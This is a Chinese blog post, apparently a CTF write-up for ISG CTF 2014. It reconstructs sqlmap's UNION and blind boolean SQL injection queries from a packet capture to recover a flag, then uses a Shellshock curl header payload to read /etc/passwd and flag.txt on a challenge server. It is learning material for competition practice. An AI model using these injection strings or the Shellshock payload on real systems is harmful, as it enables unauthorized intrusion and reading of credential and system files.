<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>ISG CTF 2014 Write-up (SQLMAP, Up-to-Date) | watch0ut Notebook</title><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/5.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.0/grids-responsive-min.css"><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">ISG CTF 2014 Write-up (SQLMAP, Up-to-Date)</h1><a id="logo" href="/.">watch0ut Notebook</a><p class="description">echo &quot;TXIuQ2VuZytHcmVhdFlZWCtKYWNrUGFuPXdhdGNoMHV0LCBhIHRlYW0gb2YgMyBjb21wdXRlciBnZWVrcy4&quot; | base64 -d</p></div><div id="nav-menu"><a href="/"><i class="fa icon-home"> 首页</i></a><a href="/about/"><i class="fa icon-about"> 关于</i></a><a href="/atom.xml"><i class="fa icon-rss"> 订阅</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">ISG CTF 2014 Write-up (SQLMAP, Up-to-Date)</h1><div class="post-meta">Sep 29, 2014<span> | </span><span class="category"><a href="/categories/CTF/">CTF</a></span><script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><div class="clear"><div id="toc" class="toc-article"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQLMAP"><span class="toc-number">1.</span> <span class="toc-text">SQLMAP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Up-to-Date"><span class="toc-number">2.</span> <span class="toc-text">Up-to-Date</span></a></li></ol></div></div><div class="post-content"><h1 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h1><p>题目很简单，就给了一个数据包：</p>
<p>数据包下载：sqlmap</p>
<p>从数据包看，<code>http://10.0.0.201/message.php?id=``？存在注入点，利用</code>sqlmap<code>进行拖库。前段时间刚好分析过</code>sqlmap`拖库过程，还算比较熟悉。</p>
<p>直接看关键点：</p>
<p>注入成功：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://10.0.0.201/message.php?id=1 AND 1922=1922</div></pre></td></tr></table></figure></p>
<p>返回：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Message #1 AND 1922=1922: The quick brown fox jumps over the lazy dog</div></pre></td></tr></table></figure></p>
<p>注入失败：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://10.0.0.201/message.php?id=1 AND 5345=8796</div></pre></td></tr></table></figure></p>
<p>返回：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Message #1 AND 5345=8796:</div></pre></td></tr></table></figure></p>
<p>可根据冒号后面是否有内容判断注入的SQL语句是否成功。</p>
<p>这里面值得注意，如果使用<code>wireshark</code>的<code>follow tcp stream</code>是看不到服务返回明文的,因为有<code>gzip</code>编码，直接双击返回的数据帧，<code>line -based text data</code>就可以显示明文了。</p>
<p>PS.当然也有捷径，比如用审计系统跑下包，直接出结果,一般人我不告诉他:D</p>
<p>有了上面基础知识后，很容易分析后面的数据包。</p>
<p>获取数据库：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://10.0.0.201/message.php?id=-2060 UNION ALL SELECT NULL,CONCAT(0x7173636371,IFNULL(CAST(DATABASE() AS CHAR),0x20),0x716f757371)#</div></pre></td></tr></table></figure></p>
<p>返回：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Message #-2060 UNION ALL SELECT NULL,CONCAT(0x7173636371,IFNULL(CAST(DATABASE() AS CHAR),0x20),0x716f757371)#: qsccqisgqousq</div><div class="line">0x7173636371=qsccq,0x716f757371=qousq，后面同理，得到当前数据库为：isg</div></pre></td></tr></table></figure></p>
<p>后面分别猜表名，列名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Message #-7713 UNION ALL SELECT NULL,CONCAT(0x7173636371,IFNULL(CAST(COUNT(table_name) AS CHAR),0x20),0x716f757371) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x697367)#: qsccq2qousq</div></pre></td></tr></table></figure></p>
<p>存在两个表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Message #-3380 UNION ALL SELECT NULL,(SELECT CONCAT(0x7173636371,IFNULL(CAST(table_name AS CHAR),0x20),0x716f757371) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x697367) LIMIT 0,1)#: qsccqflagsqousq</div></pre></td></tr></table></figure></p>
<p>存在flags表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Message #-8854 UNION ALL SELECT NULL,(SELECT CONCAT(0x7173636371,IFNULL(CAST(table_name AS CHAR),0x20),0x716f757371) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x697367) LIMIT 1,1)#: qsccqmessagesqousq</div></pre></td></tr></table></figure></p>
<p>存在messages表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Message #-8145 UNION ALL SELECT NULL,CONCAT(0x7173636371,IFNULL(CAST(COUNT(*) AS CHAR),0x20),0x716f757371) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6d65737361676573 AND table_schema=0x697367#: qsccq2qousq</div></pre></td></tr></table></figure></p>
<p>messages表有两行记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Message #-2023 UNION ALL SELECT NULL,(SELECT CONCAT(0x7173636371,IFNULL(CAST(column_name AS CHAR),0x20),0x70767673756c,IFNULL(CAST(column_type AS CHAR),0x20),0x716f757371) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6d65737361676573 AND table_schema=0x697367 LIMIT 1,1)#: qsccqvaluepvvsultinytextqousq</div></pre></td></tr></table></figure></p>
<p>messages表列名是value，类型是tinytext<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Message #-8873 UNION ALL SELECT NULL,(SELECT CONCAT(0x7173636371,IFNULL(CAST(`value` AS CHAR),0x20),0x716f757371) FROM isg.messages ORDER BY `value` LIMIT 0,1)#: qsccqThe quick brown fox jumps over the lazy dogqousq</div></pre></td></tr></table></figure></p>
<p>isg.messages中内容为：<code>The quick brown fox jumps over the lazy</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Message #-2064 UNION ALL SELECT NULL,(SELECT CONCAT(0x7173636371,IFNULL(CAST(column_name AS CHAR),0x20),0x70767673756c,IFNULL(CAST(column_type AS CHAR),0x20),0x716f757371) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x666c616773 AND table_schema=0x697367 LIMIT 1,1)#: qsccqvaluepvvsultinytextqousq</div></pre></td></tr></table></figure></p>
<p>flags表列名为value，类型tinytext<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Message #-3413 UNION ALL SELECT NULL,CONCAT(0x7173636371,IFNULL(CAST(COUNT(`value`) AS CHAR),0x20),0x716f757371) FROM isg.flags#: qsccq1qousq</div></pre></td></tr></table></figure></p>
<p>flags有一行记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://10.0.0.201/message.php?id=-3324 UNION ALL SELECT NULL,(SELECT CONCAT(0x7173636371,IFNULL(CAST(`value` AS CHAR),0x20),0x716f757371) FROM isg.flags ORDER BY `value` LIMIT 0,1)#</div></pre></td></tr></table></figure></p>
<p>直接查询flags表，没有返回结果。后面采用单字符猜测</p>
<p><code>MID()</code>函数取第一个字符，<code>MID(text,1,1)</code>,从第一个字符开始取一个字符</p>
<p><code>ORD</code>把字符转换成<code>ASCII码</code></p>
<p>根据<code>ASCII码</code>比较大小猜测是什么字符，比如下面是猜第一个字符，有<code>The quick brown fox jumps over the lazy dog</code>说明猜对了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Message #1 AND ORD(MID((SELECT IFNULL(CAST(`value` AS CHAR),0x20) FROM isg.flags ORDER BY `value` LIMIT 0,1),1,1))&gt;64: The quick brown fox jumps over the lazy dog</div><div class="line">Message #1 AND ORD(MID((SELECT IFNULL(CAST(`value` AS CHAR),0x20) FROM isg.flags ORDER BY `value` LIMIT 0,1),1,1))&gt;96:</div><div class="line">Message #1 AND ORD(MID((SELECT IFNULL(CAST(`value` AS CHAR),0x20) FROM isg.flags ORDER BY `value` LIMIT 0,1),1,1))&gt;80:</div><div class="line">Message #1 AND ORD(MID((SELECT IFNULL(CAST(`value` AS CHAR),0x20) FROM isg.flags ORDER BY `value` LIMIT 0,1),1,1))&gt;72: The quick brown fox jumps over the lazy dog</div><div class="line">Message #1 AND ORD(MID((SELECT IFNULL(CAST(`value` AS CHAR),0x20) FROM isg.flags ORDER BY `value` LIMIT 0,1),1,1))&gt;76:</div><div class="line">Message #1 AND ORD(MID((SELECT IFNULL(CAST(`value` AS CHAR),0x20) FROM isg.flags ORDER BY `value` LIMIT 0,1),1,1))&gt;74:</div><div class="line">Message #1 AND ORD(MID((SELECT IFNULL(CAST(`value` AS CHAR),0x20) FROM isg.flags ORDER BY `value` LIMIT 0,1),1,1))&gt;73:</div></pre></td></tr></table></figure></p>
<p>可以看出第一个字符<code>ASCII码</code>大于72，小于74，结果是73，对应字符是大写的<code>I</code></p>
<p>同理，可得出ASCII为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">73,83,71,123,66,76,105,110,100,95,83,81,108,95,73,110,74,69,99,84,105,48,78,95,68,101,84,69,99,84,69,100,125</div></pre></td></tr></table></figure></p>
<p>对应字符为：<code>ISG{BLind_SQl_InJEcTi0N_DeTEcTEd}</code>。</p>
<h1 id="Up-to-Date"><a href="#Up-to-Date" class="headerlink" title="Up-to-Date"></a>Up-to-Date</h1><p>ISG-2014-UP-TO-DATE</p>
<p>这道题目更新得比较迟，分值只有100，估计是临时出的题目。网站就一个首页，也没别的了</p>
<p>ISG-2014-UP-TO-DATE2</p>
<p>与其他web题目不一样，试了下首页文件，不是<code>index.php,index.htm,index.html,default.php,default.htm,default.html</code></p>
<p>要不题目有意隐藏了首页文件，要么后缀不对。猜测网页可能是其他后缀名，莫非是<code>CGI</code>？结合题目提示“每周更新服务器，以确保flag.txt安全”，让人联想到前几天爆的bash漏洞。详参：<a href="http://coolshell.cn/articles/11973.html" target="_blank" rel="external">http://coolshell.cn/articles/11973.html</a></p>
<p>果然，是这个漏洞！这应该是最快将<code>BASH</code>漏洞作为CTF题目的比赛了吧:D</p>
<p>利用命令查看服务passswd文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -H &apos;b:() &#123; :; &#125;;a=` /bin/cat /etc/passwd `;echo &quot;a=$a&quot;;&apos; http://202.112.26.125:8888/ -I</div></pre></td></tr></table></figure></p>
<p>ISG-2014-bash</p>
<p>使用<code>ls</code>查看目录，最后发现<code>flag.txt</code>在<code>/var/www</code>下面</p>
<p>于是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -H &apos;b:() &#123; :; &#125;;a=` /bin/cat /var/www/flag.txt`;echo &quot;a:$a&quot;;&apos; http://202.112.26.125:8888/ -I</div></pre></td></tr></table></figure></p>
<p><img src="/images/isg-2014-up-to-date.jpg" alt=""></p>
</div><script type="text/javascript" src="/js/share.js?v=0.0.0" async></script><a data-url="http://blog.watch0ut.com/2014/09/29/ISG-CTF-2014-Write-up-SQLMAP-Up-to-Date/" data-id="ciyjqe2d4000l2gmphdyng2am" class="article-share-link">分享到</a><div class="tags"><a href="/tags/CTF/">CTF</a></div><div class="post-nav"><a href="/2014/10/08/XD-CTF-2014-Write-ups/" class="pre">XD CTF 2014 Write-ups</a><a href="/2014/09/29/ISG-CTF-2014-Write-up-Out-of-Space-X-Area/" class="next">ISG CTF 2014 Write-up (Out of Space, X-Area)</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form action="//www.baidu.com/baidu" method="get" accept-charset="utf-8" target="_blank" class="search-form"><input type="search" name="word" maxlength="20" placeholder="Search"/><input type="hidden" name="si" value="http://blog.watch0ut.com"/><input name="tn" type="hidden" value="bds"/><input name="cl" type="hidden" value="3"/><input name="ct" type="hidden" value="2097152"/><input name="s" type="hidden" value="on"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/Misc/" style="font-size: 15px;">Misc</a> <a href="/tags/Web/" style="font-size: 15px;">Web</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最新文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2015/12/08/HCTF-2015-Write-ups/">HCTF 2015 Write-ups</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/29/9447-CTF-2015-Write-ups/">9447 CTF 2015 Write-ups</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/11/10/HCTF-2014-Write-ups/">HCTF 2014 Write-ups</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/10/08/XD-CTF-2014-Write-ups/">XD CTF 2014 Write-ups</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/09/29/ISG-CTF-2014-Write-up-SQLMAP-Up-to-Date/">ISG CTF 2014 Write-up (SQLMAP, Up-to-Date)</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/09/29/ISG-CTF-2014-Write-up-Out-of-Space-X-Area/">ISG CTF 2014 Write-up (Out of Space, X-Area)</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/09/29/ISG-CTF-2014-Write-up-Smile-Chopper-Cryptobaby-GIF/">ISG CTF 2014 Write-up (Smile, Chopper, Cryptobaby, GIF)</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/08/26/HITCON-CTF-2014-Tarmful-Write-up/">HITCON CTF 2014 Tarmful Write-up</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/08/22/HITCON-CTF-2014-DIAGCGI-Write-up/">HITCON CTF 2014 DIAGCGI Write-up</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/08/20/HITCON-CTF-2014-PY4H4SHER-Write-up/">HITCON CTF 2014 PY4H4SHER Write-up</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">© <a href="/." rel="nofollow">watch0ut Notebook.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="/css/jquery.fancybox.css?v=0.0.0"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>